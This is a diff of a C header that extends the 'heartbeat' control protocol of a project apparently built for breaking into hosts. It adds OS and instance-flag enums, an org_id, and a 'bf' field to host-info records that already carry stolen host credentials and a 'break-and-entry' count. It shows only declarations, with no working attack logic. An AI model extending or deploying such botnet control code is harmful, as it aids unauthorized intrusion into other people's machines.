@@ -25,6 +25,15 @@ typedef struct prne_htbt_stdio prne_htbt_stdio_t;
 typedef struct prne_htbt_rcb prne_htbt_rcb_t;
 
 typedef enum {
+	PRNE_OS_NONE,
+
+	PRNE_OS_LINUX,
+
+	NB_PRNE_OS
+} prne_os_t;
+PRNE_LIMIT_ENUM(prne_os_t, NB_PRNE_OS, 0xFE);
+
+typedef enum {
 	PRNE_ARCH_NONE,
 
 	PRNE_ARCH_I686,
@@ -43,6 +52,19 @@ typedef enum {
 	NB_PRNE_ARCH
 } prne_arch_t;
 PRNE_LIMIT_ENUM(prne_arch_t, NB_PRNE_ARCH, 0xFE);
+
+// Instance flags
+typedef enum {
+	PRNE_IFLAG_NONE = -1,
+
+	PRNE_IFLAG_BA, // bin archive
+	PRNE_IFLAG_INIT_RUN, // initial run
+	PRNE_IFLAG_WKR_RCN,
+	PRNE_IFLAG_WKR_RESOLV,
+	PRNE_IFLAG_WKR_HTBT,
+
+	NB_PRNE_IFLAG
+} prne_iflag_t;
 
 typedef enum {
 	PRNE_IPV_NONE,
@@ -98,6 +120,7 @@ typedef enum {
 	* 	uint8_t prog_ver[16]
 	* 	uint8_t boot_id[16]
 	* 	uint8_t instance_id[16]
+	* 	uint8_t org_id[16]
 	* 	uint64_t parent_uptime	: in seconds
 	* 	uint64_t child_uptime	: in seconds
 	* 	uint64_t bne_cnt		: break-and-entry count
@@ -107,7 +130,10 @@ typedef enum {
 	* 	uint32_t child_pid
 	* 	uint8_t host_cred_len
 	* 	uint8_t arch			: `prne_arch_t` value
+	* 	uint8_t os
+	* 	uint8_t bf_len
 	* 	uint8_t host_cred[host_cred_len]
+	* 	uint8_t bf[bf_len]
 	*/
 	PRNE_HTBT_OP_HOST_INFO,
 	/* Hand Over Operation
@@ -173,9 +199,11 @@ typedef enum {
 	/* Binary Recombination Operation
 	* TODO
 	*
-	*	uint8_t arch	: "self" assumed if PRNE_ARCH_NONE
 	*	uint1_t compat	: allow fallback to compatible arch
-	*	uint7_t rsv
+	*	uint1_t self	: os and arch not used if true
+	*	uint6_t rsv
+	*	uint8_t os
+	*	uint8_t arch
 	*/
 	PRNE_HTBT_OP_RCB,
 
@@ -231,10 +259,14 @@ struct prne_htbt_host_info {
 	uint8_t prog_ver[16];
 	uint8_t boot_id[16];
 	uint8_t instance_id[16];
+	uint8_t org_id[16];
 	uint8_t *host_cred;
 	size_t host_cred_len;
+	size_t bf_len;
+	uint8_t *bf;
 	uint32_t crash_cnt;
 	prne_arch_t arch;
+	prne_os_t os;
 };
 
 struct prne_htbt_cmd {
@@ -268,8 +300,10 @@ struct prne_htbt_stdio {
 };
 
 struct prne_htbt_rcb {
+	prne_os_t os;
 	prne_arch_t arch;
 	bool compat;
+	bool self;
 };
 
 typedef void(*prne_htbt_init_ft)(void *ptr);
@@ -311,9 +345,15 @@ typedef prne_htbt_ser_rc_t(*prne_htbt_dser_ft)(
 #define PRNE_HTBT_PROTO_SUB_MIN_BUF ((size_t)3 + 94 + 255)
 
 
+const char *prne_os_tostr (const prne_os_t x);
+prne_os_t prne_os_fstr (const char *str);
+bool prne_os_inrange (const prne_os_t x);
 const char *prne_arch_tostr (const prne_arch_t x);
 prne_arch_t prne_arch_fstr (const char *str);
 bool prne_arch_inrange (const prne_arch_t x);
+const char *prne_iflag_tostr (const prne_iflag_t x);
+prne_iflag_t prne_iflag_fstr (const char *str);
+bool prne_iflag_inrange (const prne_iflag_t x);
 
 bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b);
 void prne_net_ep_tosin4 (
@@ -365,7 +405,8 @@ prne_htbt_ser_rc_t prne_dec_host_cred (
 void prne_htbt_init_host_info (prne_htbt_host_info_t *hi);
 bool prne_htbt_alloc_host_info (
 	prne_htbt_host_info_t *hi,
-	const size_t cred_len);
+	const size_t cred_len,
+	const size_t bf_len);
 void prne_htbt_free_host_info (prne_htbt_host_info_t *hi);
 bool prne_htbt_eq_host_info (
 	const prne_htbt_host_info_t *a,
